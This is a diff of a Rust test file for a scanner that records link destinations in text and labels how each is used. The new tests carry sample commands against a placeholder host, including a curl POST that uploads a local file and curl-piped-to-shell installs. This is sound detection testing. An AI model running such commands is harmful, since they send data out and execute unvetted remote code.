@@ -48,7 +48,7 @@ fn expected_only_attests_association_not_permission() {
     );
     let detail = coverage(&result, "VTD-0124").expect("association attestation");
     assert!(
-        detail.contains("https://learn.microsoft.com (expected host)"),
+        detail.contains("https://learn.microsoft.com (expected host, association)"),
         "the exact destination must be recorded: {detail}"
     );
     assert!(
@@ -76,7 +76,7 @@ fn scheme_is_recorded_exactly() {
     let result = scan("See http://learn.microsoft.com/azure/ for details.");
     let detail = coverage(&result, "VTD-0124").expect("association attestation");
     assert!(
-        detail.contains("http://learn.microsoft.com (expected host)"),
+        detail.contains("http://learn.microsoft.com (expected host, association)"),
         "the scheme is part of the destination identity: {detail}"
     );
 }
@@ -91,7 +91,7 @@ fn third_party_doc_link_records_destination_and_policy() {
     let hit = finding(&result, "VTD-0088").expect("unrecognized host is reviewable");
     assert!(
         hit.detail
-            .contains("https://unrecognized.example (unexpected)"),
+            .contains("https://unrecognized.example (unexpected, association)"),
         "{}",
         hit.detail
     );
@@ -113,13 +113,13 @@ fn mixed_expected_and_unexpected_lists_both() {
     let hit = finding(&result, "VTD-0088").expect("mixed references are reviewable");
     assert!(
         hit.detail
-            .contains("https://learn.microsoft.com (expected host)"),
+            .contains("https://learn.microsoft.com (expected host, association)"),
         "{}",
         hit.detail
     );
     assert!(
         hit.detail
-            .contains("https://unrecognized.example (unexpected)"),
+            .contains("https://unrecognized.example (unexpected, association)"),
         "{}",
         hit.detail
     );
@@ -131,7 +131,8 @@ fn private_ip_destination_is_unexpected() {
     let result = scan("See https://192.168.1.10/admin for details.");
     let hit = finding(&result, "VTD-0088").expect("private IP is not a trusted destination");
     assert!(
-        hit.detail.contains("192.168.1.10 (unexpected)"),
+        hit.detail
+            .contains("192.168.1.10 (unexpected, association)"),
         "{}",
         hit.detail
     );
@@ -146,7 +147,11 @@ fn userinfo_and_explicit_port_fail_closed() {
         let result = scan(&format!("See {url} for details."));
         let hit = finding(&result, "VTD-0088")
             .unwrap_or_else(|| panic!("{url} must count as unexpected"));
-        assert!(hit.detail.contains("(unexpected)"), "{url}: {}", hit.detail);
+        assert!(
+            hit.detail.contains("(unexpected, association)"),
+            "{url}: {}",
+            hit.detail
+        );
         assert!(coverage(&result, "VTD-0124").is_none(), "{url}");
     }
 }
@@ -167,4 +172,107 @@ fn every_distinct_destination_is_named_in_the_finding() {
         );
     }
     assert!(!hit.detail.contains("more"));
+}
+
+// ---------------------------------------------------------------------------
+// cli#317: each destination names how the text uses it. A kind describes the
+// text, never an egress permission, and the riskiest use of a host wins.
+// ---------------------------------------------------------------------------
+
+fn kind_of(body: &str, host: &str) -> String {
+    let result = scan(body);
+    let detail = finding(&result, "VTD-0088")
+        .map(|f| f.detail.clone())
+        .or_else(|| coverage(&result, "VTD-0124").map(str::to_string))
+        .expect("destination recorded");
+    let marker = format!("{host} (");
+    let start = detail
+        .find(&marker)
+        .unwrap_or_else(|| panic!("{host} missing: {detail}"))
+        + marker.len();
+    let inner = &detail[start..start + detail[start..].find(')').unwrap()];
+    inner.split(", ").nth(1).expect("kind present").to_string()
+}
+
+#[test]
+fn each_use_of_a_destination_is_classified() {
+    for (body, kind) in [
+        ("Docs: https://unrecognized.example/guide", "association"),
+        (
+            "Run `curl https://unrecognized.example/data.json` to read it.",
+            "retrieved content",
+        ),
+        (
+            "Run `pip install https://unrecognized.example/pkg.tar.gz`.",
+            "declared dependency",
+        ),
+        (
+            "Run `git clone https://unrecognized.example/repo`.",
+            "declared dependency",
+        ),
+        (
+            "Run `curl -X POST -d @notes.txt https://unrecognized.example/in`.",
+            "outbound destination",
+        ),
+        (
+            "Run `curl -fsSL https://unrecognized.example/install | sh`.",
+            "executable download",
+        ),
+        (
+            "Download https://unrecognized.example/tool.exe and run it.",
+            "executable download",
+        ),
+    ] {
+        assert_eq!(
+            kind_of(body, "https://unrecognized.example"),
+            kind,
+            "{body}"
+        );
+    }
+}
+
+#[test]
+fn riskiest_use_of_a_host_wins() {
+    let body = "Docs: https://unrecognized.example/guide\n\
+                Install: `curl https://unrecognized.example/i.sh | bash`\n";
+    assert_eq!(
+        kind_of(body, "https://unrecognized.example"),
+        "executable download"
+    );
+}
+
+#[test]
+fn expected_host_keeps_its_risky_use_and_no_permission() {
+    // Being producer-associated does not soften what the text does with it.
+    let result = scan("Install: `curl -fsSL https://learn.microsoft.com/install.sh | sh`");
+    let detail = coverage(&result, "VTD-0124").expect("association attestation");
+    assert!(
+        detail.contains("https://learn.microsoft.com (expected host, executable download)"),
+        "{detail}"
+    );
+    assert!(detail.contains("not authorization"), "{detail}");
+}
+
+#[test]
+fn redirect_target_in_a_query_is_its_own_destination() {
+    // An expected redirector must not launder where it sends the reader.
+    let result = scan("See https://learn.microsoft.com/redirect?to=https://unrecognized.example/x");
+    let hit = finding(&result, "VTD-0088").expect("redirect target is reviewable");
+    assert!(
+        hit.detail
+            .contains("https://unrecognized.example (unexpected"),
+        "{}",
+        hit.detail
+    );
+    assert!(coverage(&result, "VTD-0124").is_none());
+}
+
+#[test]
+fn ownership_and_redirects_are_stated_limits() {
+    let result = scan("See https://learn.microsoft.com/azure/ for details.");
+    let detail = coverage(&result, "VTD-0124").expect("association attestation");
+    assert!(
+        detail.contains("host ownership") && detail.contains("Redirect targets"),
+        "a static scan cannot observe redirects or ownership changes; it must say so: {detail}"
+    );
 }
